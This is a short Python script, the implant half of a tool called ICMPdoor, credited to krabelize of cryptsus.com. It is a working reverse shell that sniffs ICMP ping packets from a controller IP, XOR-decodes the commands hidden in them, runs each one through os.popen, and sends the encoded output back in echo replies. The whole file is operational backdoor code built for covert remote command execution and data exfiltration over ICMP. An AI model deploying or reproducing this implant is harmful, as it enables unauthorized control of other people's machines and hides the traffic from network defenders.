#!/usr/bin/env python3
#ICMPdoor (IMCP reverse shell) [implant]
#By krabelize | cryptsus.com
#More info: https://cryptsus.com/blog/icmp-reverse-shell.html
from scapy.all import sr,IP,ICMP,Raw,sniff
import argparse
import os

#Variables
ICMP_ID = int(13170)
TTL = int(64)

def dec(payload, xorkey):
    ret = bytearray()
    for byte in payload:
        ret += (byte ^ xorkey).to_bytes(1,'big')
    return ret

def enc(payload, xorkey):
    raw = bytes()
    ret_payload = bytes()
    for obj in payload:
        raw += obj.encode()
    for byte in raw:
        ret_payload += (byte ^ xorkey).to_bytes(1, 'big')
    return ret_payload

def check_scapy():
    try:
        from scapy.all import sr,IP,ICMP,Raw,sniff
    except ImportError:
        print("Install the Py3 scapy module")

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', type=str, required=True, help="(Virtual) Network Interface (e.g. eth0)")
parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
args = parser.parse_args()

def icmpshell(pkt):
    if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 8 and pkt[ICMP].id == ICMP_ID and pkt[Raw].load:
        impacket_raw = dec((pkt[Raw].load), 0x13)
        icmppaket = impacket_raw.decode('utf-8', errors='ignore')
        payload = os.popen(icmppaket).readlines()
        raw_payload = enc(payload, 0x13)
        icmppacket = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/raw_payload)
        sr(icmppacket, timeout=0, verbose=0)
    else:
        pass

print("[+]ICMP listener started!")
sniff(iface=args.interface, prn=icmpshell, filter="icmp", store="0")
